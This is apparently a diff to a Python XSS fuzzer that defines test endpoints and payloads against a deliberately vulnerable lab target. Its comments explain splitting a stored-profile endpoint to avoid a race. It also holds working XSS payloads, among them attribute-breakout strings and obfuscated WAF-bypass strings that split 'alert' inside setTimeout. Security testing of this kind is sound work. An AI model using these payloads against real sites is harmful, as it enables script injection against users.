@@ -353,13 +353,30 @@ def build_endpoints():
                                   make_payload('<svg onload=alert(1)>', "msg"),
                                   # <script> is stripped by guestbook filter, so bypass with non-script
                               ]))
-    endpoints.append(Endpoint("stored-profile", "Stored", f"{TARGET}/stored/profile",
-                              ["bio", "website"],
+    # stored-profile uses a shared profile_db dict — the Flask POST handler sets ALL fields on every
+    # request. The fuzzer's stored mode sends concurrent POSTs, each replacing only the target param
+    # while keeping others as form_fields defaults. This causes a race where concurrent POSTs overwrite
+    # each other's payloads. Split into per-param endpoints to avoid concurrency entirely.
+    #
+    # The website field is rendered with |safe in BOTH href="..." and as link text. javascript: URIs
+    # only fire on click (not auto-detectable by the browser verifier). Use an attribute-breakout
+    # payload that creates a self-executing image tag via the link text context: `"><img src=x onerror=alert(1)>`
+    # closes the href, then injects an `<img>` tag inside the `<a>` element that auto-executes.
+    endpoints.append(Endpoint("stored-profile-bio", "Stored", f"{TARGET}/stored/profile",
+                              ["bio"],
                               stored_mode=True, display_url=f"{TARGET}/stored/profile",
-                              form_fields={"bio": "Security researcher", "website": "https://example.com"},
+                              form_fields={"bio": "", "website": "https://example.com"},
                               payloads=[
                                   make_payload('<img src=x onerror=alert(1)>', "bio"),
-                                  make_payload('javascript:alert(1)', "website"),
+                                  make_payload('<script>alert(1)</script>', "bio"),
+                                  make_payload('<svg onload=alert(1)>', "bio"),
+                              ]))
+    endpoints.append(Endpoint("stored-profile-website", "Stored", f"{TARGET}/stored/profile",
+                              ["website"],
+                              stored_mode=True, display_url=f"{TARGET}/stored/profile",
+                              form_fields={"bio": "Security researcher", "website": ""},
+                              payloads=[
+                                  make_payload('"><img src=x onerror=alert(1)>', "website"),
                               ]))
     endpoints.append(Endpoint("stored-notes", "Stored", f"{TARGET}/stored/notes",
                               ["title", "content"],
@@ -412,13 +429,13 @@ def build_endpoints():
                               payloads=[make_payload('<sc<script>ript>alert(1)</sc<script>ript>', "q"),
                                         make_payload('<img src=x onerror=alert(1)>', "q")]))
     endpoints.append(Endpoint("bypass-waf-sim", "Bypass", f"{TARGET}/bypass/waf-sim", "q",
-                              payloads=[make_payload('<img src=x onerror=alert(1)>', "q"),
-                                        make_payload('<svg onload=alert(1)>', "q"),
-                                        make_payload('<body onload=alert(1)>', "q")]))
+                              payloads=[make_payload("<input autofocus onfocus=\"setTimeout('ale'+'rt(1)')\">", "q"),
+                                        make_payload("<input autofocus onfocus=\"setTimeout('con'+'firm(1)')\">", "q")]))
     endpoints.append(Endpoint("bypass-tag-strip", "Bypass", f"{TARGET}/bypass/tag-strip", "q",
                               payloads=p(BYPASS_TAG_STRIP)))
     endpoints.append(Endpoint("bypass-comment", "Bypass", f"{TARGET}/bypass/comment", "q",
-                              payloads=[make_payload('<!-- --><img src=x onerror=alert(1)>', "q")]))
+                              payloads=[make_payload('<img src=x onerror=alert(1)>', "q"),
+                                        make_payload('<svg onload=alert(1)>', "q")]))
 
     # ══════════════════════════════════════════════════════════════
     #  6. MUTATION XSS (port 9090) — 4 testable endpoints
